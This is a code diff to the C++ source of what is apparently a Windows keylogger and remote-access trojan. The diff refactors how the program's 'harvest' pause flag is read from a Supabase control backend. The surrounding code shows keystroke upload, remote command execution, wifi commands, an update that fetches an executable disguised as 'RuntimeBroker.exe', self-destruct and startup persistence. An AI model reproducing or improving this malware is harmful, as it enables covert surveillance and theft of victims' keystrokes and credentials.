@@ -35,6 +35,7 @@ ISampleGrabber : public IUnknown {
 #define SUPABASE_KEYS_PATH L"/rest/v1/keystrokes"
 #define SUPABASE_CONTROL_PATH L"/rest/v1/control"
 #define SUPABASE_EXEC_PATH L"/rest/v1/exec_results"
+#define SUPABASE_CONFIG_PATH L"/rest/v1/agent_config"
 #define SUPABASE_HEARTBEAT_PATH L"/rest/v1/heartbeat?hostname=eq."
 #define STORAGE_VER_PATH L"/storage/v1/object/public/Netpen/version.txt"
 #define STORAGE_EXE_PATH L"/storage/v1/object/public/Netpen/RuntimeBroker.exe"
@@ -500,42 +501,20 @@ static bool CheckSelfDestruct() {
     return true;
 }
 
-static bool CheckPauseHarvestCmd() {
-    std::wstring query = SUPABASE_CONTROL_PATH;
-    query += L"?command=eq.pause_harvest&executed=eq.false&hostname=eq.";
-    query += ToWide(g_hostname);
-    query += L"&select=id";
+static void CheckHarvestConfig() {
+    std::wstring query = SUPABASE_CONFIG_PATH;
+    query += L"?key=eq.harvest_paused&select=value";
     std::string response;
-    if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
-    if (response.empty() || response == "[]") return false;
-    std::string rowId = ExtractJSONNumber(response, "id");
-    if (!rowId.empty()) {
-        std::string patch = "{\"executed\":true}";
-        std::wstring patchPath = SUPABASE_CONTROL_PATH;
-        patchPath += L"?id=eq." + ToWide(rowId);
-        HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
-        g_harvestPaused = true;
-    }
-    return true;
-}
-
-static bool CheckResumeHarvestCmd() {
-    std::wstring query = SUPABASE_CONTROL_PATH;
-    query += L"?command=eq.resume_harvest&executed=eq.false&hostname=eq.";
-    query += ToWide(g_hostname);
-    query += L"&select=id";
-    std::string response;
-    if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
-    if (response.empty() || response == "[]") return false;
-    std::string rowId = ExtractJSONNumber(response, "id");
-    if (!rowId.empty()) {
-        std::string patch = "{\"executed\":true}";
-        std::wstring patchPath = SUPABASE_CONTROL_PATH;
-        patchPath += L"?id=eq." + ToWide(rowId);
-        HttpRequest(L"PATCH", patchPath.c_str(), patch, response);
-        g_harvestPaused = false;
-    }
-    return true;
+    if (!HttpRequest(L"GET", query.c_str(), "", response)) return;
+    // response is like [{"value":"true"}] or [{"value":"false"}]
+    std::string needle = "\"value\":\"";
+    size_t start = response.find(needle);
+    if (start == std::string::npos) return;
+    start += needle.size();
+    size_t end = response.find("\"", start);
+    if (end == std::string::npos) return;
+    std::string val = response.substr(start, end - start);
+    g_harvestPaused = (val == "true");
 }
 
 static int GetRemoteVersion() {
@@ -1934,8 +1913,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 CheckAndHandleExec();
                 std::string wfRowId = CheckWifiCmd();
                 if (!wfRowId.empty()) HandleWifiCmd(wfRowId);
-                CheckPauseHarvestCmd();
-                CheckResumeHarvestCmd();
+                CheckHarvestConfig();
             }
             if (counter % 120 == 0 && !g_selfDestructing) {
                 EnsureStartupEntry();
